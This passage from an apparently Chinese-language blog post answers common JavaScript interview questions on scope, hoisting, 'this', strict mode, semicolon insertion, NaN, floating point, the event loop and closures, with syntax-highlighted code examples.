&amp;&amp; (toString.call(bar) !== <span class="string">"[object Array]"</span>));</span><br></pre></td></tr></table></figure><p>但是，还有一个替代方法对空值，数组和函数返回false，但对对象返回true：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((bar !== <span class="literal">null</span>) &amp;&amp; (bar.constructor === <span class="built_in">Object</span>));</span><br></pre></td></tr></table></figure><p>或者，如果您使用jQuery：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((bar !== <span class="literal">null</span>) &amp;&amp; (<span class="keyword">typeof</span> bar === <span class="string">"object"</span>) &amp;&amp; (! $.isArray(bar)));</span><br></pre></td></tr></table></figure><p>ES5使得数组的情况非常简单，包括它自己的空检查：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.isArray(bar));</span><br></pre></td></tr></table></figure><h2 id="下面的代码将输出到控制台的是什么，为什么"><a href="#下面的代码将输出到控制台的是什么，为什么" class="headerlink" title="下面的代码将输出到控制台的是什么，为什么"></a>下面的代码将输出到控制台的是什么，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = b = <span class="number">3</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a defined? "</span> + (<span class="keyword">typeof</span> a !== <span class="string">'undefined'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"b defined? "</span> + (<span class="keyword">typeof</span> b !== <span class="string">'undefined'</span>));</span><br></pre></td></tr></table></figure><p>由于a和b都在函数的封闭范围内定义，并且由于它们所在的行以var关键字开头，因此大多数JavaScript开发人员会希望<code>typeof a</code>和<code>typeof b</code>在上面的示例中都未定义。</p><p>但是，情况并非如此。这里的问题是大多数开发人员不正确地理解该语句<code>var a = b = 3;</code>简写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> a = b;</span><br></pre></td></tr></table></figure><p>但实际上，<code>var a = b = 3;</code>其实是速记：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> a = b;</span><br></pre></td></tr></table></figure><p>因此（如果您不使用严格模式），代码片段的输出将为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a defined? <span class="literal">false</span></span><br><span class="line">b defined? <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>但是如何在闭包范围外定义b呢？因为声明<code>var a = b = 3;</code>是语句<code>b = 3</code>的简写，同时<code>var a = b;</code>,故b最终成为了一个全局变量（因为它不在var关键字后面）。所以它还在作用域内，即使在封闭函数之外。</p><p>请注意，在严格模式下（即with use strict），该语句<code>var a = b = 3;</code>在运行时会报错<code>ReferenceError: b is not defined</code>，从而避免可能导致的任何headfakes/bugs。（作为的另一个主要例子，这就是你为什么在代码中应该理所当然的使用use strict！）</p><h2 id="下面的代码在控制台将输出什么，为什么"><a href="#下面的代码在控制台将输出什么，为什么" class="headerlink" title="下面的代码在控制台将输出什么，为什么"></a>下面的代码在控制台将输出什么，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">    foo: <span class="string">"bar"</span>,</span><br><span class="line">    func: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"outer func:  this.foo = "</span> + <span class="keyword">this</span>.foo);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"outer func:  self.foo = "</span> + self.foo);</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"inner func:  this.foo = "</span> + <span class="keyword">this</span>.foo);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"inner func:  self.foo = "</span> + self.foo);</span><br><span class="line">        &#125;());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">myObject.func();</span><br></pre></td></tr></table></figure><p>以上代码将输出到控制台：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">outer func:  <span class="keyword">this</span>.foo = bar</span><br><span class="line">outer func:  self.foo = bar</span><br><span class="line">inner func:  <span class="keyword">this</span>.foo = <span class="literal">undefined</span></span><br><span class="line">inner func:  self.foo = bar</span><br></pre></td></tr></table></figure><p>在外部函数，这两个this和self参考myObject，因此两者都可以正确地引用和访问foo。</p><p>然而，在内部函数中，this不能再访问myObject。因此，this.foo在内部函数中未定义，而对局部变量的引用self保持在范围内并且可以在那里访问。</p><h2 id="在功能块中封装JavaScript源文件的全部内容的重要性和原因是什么"><a href="#在功能块中封装JavaScript源文件的全部内容的重要性和原因是什么" class="headerlink" title="在功能块中封装JavaScript源文件的全部内容的重要性和原因是什么"></a>在功能块中封装JavaScript源文件的全部内容的重要性和原因是什么</h2><p>这是一种日益普遍的做法，被许多流行的JavaScript库（jQuery，Node.js等）所采用。这种技术在文件的全部内容周围创建一个闭包，这可能最重要的是创建一个私有名称空间，从而有助于避免不同JavaScript模块和库之间的潜在名称冲突。</p><p>这种技术的另一个特点是为全局变量提供一个容易引用（可能更短）的别名。例如，这通常用于jQuery插件。jQuery允许您使用禁用$对jQuery名称空间的引用jQuery.noConflict()。如果这样做了，你的代码仍然可以$使用这种闭包技术，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123; <span class="comment">/* jQuery plugin code referencing $ */</span> &#125; )(jQuery);</span><br></pre></td></tr></table></figure><h2 id="在JavaScript源文件的开始部分包含’use-strict’有什么意义以及好处"><a href="#在JavaScript源文件的开始部分包含’use-strict’有什么意义以及好处" class="headerlink" title="在JavaScript源文件的开始部分包含’use strict’有什么意义以及好处"></a>在JavaScript源文件的开始部分包含’use strict’有什么意义以及好处</h2><p>最简单也是最重要的答案是，<code>use strict</code>是一种在运行时自动执行更严格的JavaScript代码解析和错误处理的方法。如果代码错误被忽略或失败，将会产生错误或抛出异常。总的来说，这是一个很好的做法。</p><p>严格模式的一些主要优点包括：</p><ul><li>使调试更容易。如果代码错误本来会被忽略或失败，那么现在将会产生错误或抛出异常，从而更快地发现代码中的问题，并更快地指引它们的源代码。</li><li>防止意外全局。如果没有严格模式，将值赋给未声明的变量会自动创建一个具有该名称的全局变量。这是JavaScript中最常见的错误之一。在严格模式下，尝试这样做会抛出错误。</li><li>消除<code>this</code>的威胁。在没有严格模式的情况下，this对空值或未定义值的引用会自动强制到全局。这可能会导致许多<code>headfakes</code>和<code>pull-out-your-hair</code>类型的错误。在严格模式下，引用thisnull或undefined的值会抛出错误。</li><li>不允许重复的参数值。 严格模式在检测到函数的重复命名参数（例如，function foo(val1, val2, val1){}）时会引发错误，从而捕获代码中几乎可以肯定存在的错误，否则可能会浪费大量时间追踪。<ul><li>注意：它曾经是（在ECMAScript 5中）严格模式将不允许重复的属性名称（例如var object = {foo: “bar”, foo: “baz”};），但从ECMAScript 2015开始不再是这种情况。</li></ul></li><li>使eval（）更安全。eval()在严格模式和非严格模式下，表现 方式存在一些差异。最重要的是，在严格模式下，声明eval()内部声明的变量和函数不会在包含范围中创建（它们是以非严格模式在包含范围中创建的，这也可能是问题的常见来源）。</li><li>抛出错误或无效使用的delete。 delete操作符（用于从对象中删除属性）不能在对象的非配置属性上来使用。当试图删除一个不可配置的属性时，非严格代码将自动失败，而在这种情况下，严格模式会引发错误。</li></ul><h2 id="思考下面的两个函数。他们都会返回相同的值吗？为什么"><a href="#思考下面的两个函数。他们都会返回相同的值吗？为什么" class="headerlink" title="思考下面的两个函数。他们都会返回相同的值吗？为什么"></a>思考下面的两个函数。他们都会返回相同的值吗？为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      bar: <span class="string">"hello"</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">  &#123;</span><br><span class="line">      bar: <span class="string">"hello"</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>令人惊讶的是，这两个函数不会返回相同的结果。而是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"foo1 returns:"</span>);<span class="comment">//foo1 returns:</span></span><br><span class="line"><span class="built_in">console</span>.log(foo1());<span class="comment">//Object &#123;bar: "hello"&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"foo2 returns:"</span>);<span class="comment">//foo2 returns:</span></span><br><span class="line"><span class="built_in">console</span>.log(foo2());<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>这不仅令人惊讶，而且特别令人烦恼的是foo2()返回未定义而没有引发任何错误。</p><p>原因与JavaScript中分号在技术上是可选的事实有关（尽管忽略它们通常是非常糟糕的形式）。因此，在foo2（）中遇到包含return语句的行（没有其他内容）时，会在return语句之后立即自动插入分号。</p><p>由于代码的其余部分是完全有效的，即使它没有被调用或做任何事情（它只是一个未使用的代码块，它定义了一个属性栏，它等于字符串“hello”），所以不会抛出任何错误。</p><p>这种行为也被认为是遵循了在JavaScript中将一行开头大括号放在行尾的约定，而不是在新行的开头。如此处所示，这不仅仅是JavaScript中的一种风格偏好。</p><h2 id="什么是NaN？它的类型是什么？如何可靠地测试一个值是否等于NaN"><a href="#什么是NaN？它的类型是什么？如何可靠地测试一个值是否等于NaN" class="headerlink" title="什么是NaN？它的类型是什么？如何可靠地测试一个值是否等于NaN"></a>什么是NaN？它的类型是什么？如何可靠地测试一个值是否等于NaN</h2><p>NaN属性表示“不是数字”的值。这个特殊值是由于一个操作数是非数字的（例如“abc”/ 4）或者因为操作的结果是非数字而无法执行的。</p><p>虽然这看起来很简单，但NaN有一些令人惊讶的特征，如果人们没有意识到这些特征，就会导致bug。</p><p>一方面，虽然NaN的意思是“不是数字”，但它的类型是，数字：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="literal">NaN</span> === <span class="string">"number"</span>);  <span class="comment">// logs "true"</span></span><br></pre></td></tr></table></figure><p>此外，NaN相比任何事情 - 甚至本身！ - 是false：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">NaN</span> === <span class="literal">NaN</span>);  <span class="comment">// logs "false"</span></span><br></pre></td></tr></table></figure><p>测试数字是否等于NaN的半可靠方法是使用内置函数isNaN（），但即使使用isNaN（）也不是一个好的解决方案。.</p><p>一个更好的解决方案要么是使用value！==值，如果该值等于NaN，那么只会生成true。另外，ES6提供了一个新的Number.isNaN（）函数 ，它与旧的全局isNaN（）函数不同，也更加可靠。</p><h2 id="下面的代码输出什么？解释你的答案"><a href="#下面的代码输出什么？解释你的答案" class="headerlink" title="下面的代码输出什么？解释你的答案"></a>下面的代码输出什么？解释你的答案</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">0.1</span> + <span class="number">0.2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">0.1</span> + <span class="number">0.2</span> == <span class="number">0.3</span>);</span><br></pre></td></tr></table></figure><p>对这个问题的一个有教养的回答是：“你不能确定。它可能打印出0.3和true，或者可能不打印。 JavaScript中的数字全部用浮点精度处理，因此可能不会总是产生预期的结果。“</p><p>上面提供的示例是演示此问题的经典案例。令人惊讶的是，它会打印出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.30000000000000004</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure><p>一个典型的解决方案是比较两个数字与特殊常数Number.EPSILON之间的绝对差值：</p><p>讨论写函数的可能方法isInteger（x），它确定x是否是一个整数。</p><p>这听起来很平凡，事实上，ECMAscript 6为此正好引入了一个新的Number.isInteger（）函数，这是微不足道的。但是，在ECMAScript 6之前，这有点复杂，因为没有提供与Number.isInteger（）方法等价的方法。</p><p>问题在于，在ECMAScript规范中，整数只在概念上存在;即数值始终作为浮点值存储。</p><p>考虑到这一点，最简单，最清洁的ECMAScript-6之前的解决方案（即使将非数字值（例如字符串或空值）传递给该函数，该解决方案也具有足够的可靠性以返回false）将成为以下用法按位异或运算符：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isInteger</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> (x ^ <span class="number">0</span>) === x; &#125;</span><br></pre></td></tr></table></figure><p>下面的解决方案也可以工作，尽管不如上面那样高雅</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isInteger</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">Math</span>.round(x) === x; &#125;</span><br></pre></td></tr></table></figure><p>请注意，在上面的实现中Math.ceil（）或Math.floor（）可以同样使用（而不是Math.round（））。</p><p>或者：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isInteger</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> (<span class="keyword">typeof</span> x === <span class="string">'number'</span>) &amp;&amp; (x % <span class="number">1</span> === <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><p>一个相当常见的不正确的解决方案如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isInteger</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">parseInt</span>(x, <span class="number">10</span>) === x; &#125;</span><br></pre></td></tr></table></figure><p>虽然这个基于parseInt的方法对许多x值很有效，但一旦x变得相当大，它将无法正常工作。问题是parseInt（）在解析数字之前将其第一个参数强制转换为字符串。因此，一旦数字变得足够大，其字符串表示将以指数形式呈现（例如1e + 21）。因此，parseInt（）将尝试解析1e + 21，但是当它到达e字符时将停止解析，因此将返回值1.观察：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">String</span>(<span class="number">1000000000000000000000</span>)</span><br><span class="line"><span class="string">'1e+21'</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="number">1000000000000000000000</span>, <span class="number">10</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="number">1000000000000000000000</span>, <span class="number">10</span>) === <span class="number">1000000000000000000000</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="执行下面的代码时，按什么顺序将数字1-4记录到控制台？为什么"><a href="#执行下面的代码时，按什么顺序将数字1-4记录到控制台？为什么" class="headerlink" title="执行下面的代码时，按什么顺序将数字1-4记录到控制台？为什么"></a>执行下面的代码时，按什么顺序将数字1-4记录到控制台？为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">2</span>)&#125;, <span class="number">1000</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">3</span>)&#125;, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">4</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这些值将按以下顺序记录：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>我们先来解释一下这些可能更为明显的部分：</p><ul><li>首先显示1和4，因为它们是通过简单调用console.log（）而没有任何延迟记录的</li><li>在3之后显示，因为在延迟1000毫秒（即1秒）之后记录2，而在0毫秒的延迟之后记录3。</li></ul><p>好的。但是，如果在延迟0毫秒后记录3，这是否意味着它正在被立即记录？而且，如果是这样，不应该在4之前记录它，因为4是由后面的代码行记录的吗？</p><p>答案与正确理解JavaScript事件和时间有关。</p><p>浏览器有一个事件循环，它检查事件队列并处理未决事件。例如，如果在浏览器繁忙时（例如，处理onclick）在后台发生事件（例如脚本onload事件），则该事件被附加到队列中。当onclick处理程序完成时，将检查队列并处理该事件（例如，执行onload脚本）。</p><p>同样，如果浏览器繁忙，setTimeout（）也会将其引用函数的执行放入事件队列中。</p><p>当值为零作为setTimeout（）的第二个参数传递时，它将尝试“尽快”执行指定的函数。具体来说，函数的执行放置在事件队列中，以在下一个计时器滴答时发生。但请注意，这不是直接的;该功能不会执行，直到下一个滴答声。这就是为什么在上面的例子中，调用console.log（4）发生在调用console.log（3）之前（因为调用console.log（3）是通过setTimeout调用的，所以稍微延迟了一点）。</p><h2 id="编写一个简单的函数（少于160个字符），返回一个布尔值，指示字符串是否是palindrome"><a href="#编写一个简单的函数（少于160个字符），返回一个布尔值，指示字符串是否是palindrome" class="headerlink" title="编写一个简单的函数（少于160个字符），返回一个布尔值，指示字符串是否是palindrome"></a>编写一个简单的函数（少于160个字符），返回一个布尔值，指示字符串是否是palindrome</h2><p>如果str是回文，以下一行函数将返回true;否则，它返回false。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/\W/g</span>, <span class="string">''</span>).toLowerCase();</span><br><span class="line">  <span class="keyword">return</span> (str == str.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(isPalindrome(<span class="string">"level"</span>));                   <span class="comment">// logs 'true'</span></span><br><span class="line"><span class="built_in">console</span>.log(isPalindrome(<span class="string">"levels"</span>));                  <span class="comment">// logs 'false'</span></span><br><span class="line"><span class="built_in">console</span>.log(isPalindrome(<span class="string">"A car, a man, a maraca"</span>));  <span class="comment">// logs 'true'</span></span><br></pre></td></tr></table></figure><h2 id="写一个sum方法，当使用下面的语法调用时它将正常工作"><a href="#写一个sum方法，当使用下面的语法调用时它将正常工作" class="headerlink" title="写一个sum方法，当使用下面的语法调用时它将正常工作"></a>写一个sum方法，当使用下面的语法调用时它将正常工作</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>,<span class="number">3</span>));   <span class="comment">// Outputs 5</span></span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>)(<span class="number">3</span>));  <span class="comment">// Outputs 5</span></span><br></pre></td></tr></table></figure><p>有（至少）两种方法可以做到这一点：</p><p>METHOD 1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">arguments</span>.length == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">arguments</span>[<span class="number">0</span>] + <span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在JavaScript中，函数提供对参数对象的访问，该对象提供对传递给函数的实际参数的访问。这使我们能够使用length属性在运行时确定传递给函数的参数的数量</p><p>如果传递两个参数，我们只需将它们相加并返回。</p><p>否则，我们假设它是以sum（2）（3）的形式被调用的，所以我们返回一个匿名函数，它将传递给sum（）（在本例中为2）的参数和传递给匿名函数的参数这种情况3）。</p><p>METHOD 2</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当函数被调用时，JavaScript不需要参数的数量来匹配函数定义中参数的数量。如果传递的参数数量超过了函数定义中参数的数量，则超出的参数将被忽略。另一方面，如果传递的参数数量少于函数定义中的参数数量，则在函数内引用时，缺少的参数将具有未定义的值。因此，在上面的例子中，通过简单地检查第二个参数是否未定义，我们可以确定函数被调用的方式并相应地继续。</p><h2 id="考虑下面的代码片段"><a href="#考虑下面的代码片段" class="headerlink" title="考虑下面的代码片段"></a>考虑下面的代码片段</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> btn = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span><br><span class="line">  btn.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'Button '</span> + i));</span><br><span class="line">  btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(i); &#125;);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(btn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(a) 当用户点击“按钮4”时，什么被记录到控制台？为什么？</p><p>(b) 提供一个或多个可按预期工作的替代实现。</p><p>答：</p><p>(a) 无论用户点击哪个按钮，数字5将始终记录到控制台。这是因为，在调用onclick方法（对于任何按钮）时，for循环已经完成，并且变量i已经具有值5.（如果受访者知道足够的话就可以获得奖励点数关于执行上下文，变量对象，激活对象和内部“范围”属性如何影响闭包行为。）</p><p>(b) 使这项工作的关键是通过将它传递给新创建的函数对象来捕获每次通过for循环的i的值。以下是四种可能的方法来实现这一点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> btn = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span><br><span class="line">  btn.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'Button '</span> + i));</span><br><span class="line">  btn.addEventListener(<span class="string">'click'</span>, (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;;</span><br><span class="line">  &#125;)(i));</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(btn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，您可以将新的匿名函数中的整个调用包装为btn.addEventListener：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> btn = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span><br><span class="line">  btn.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'Button '</span> + i));</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">    btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(btn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，我们可以通过调用数组对象的原生forEach方法来替换for循环：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>].forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> btn = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span><br><span class="line">  btn.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'Button '</span> + i));</span><br><span class="line">  btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(btn);</span><br><span 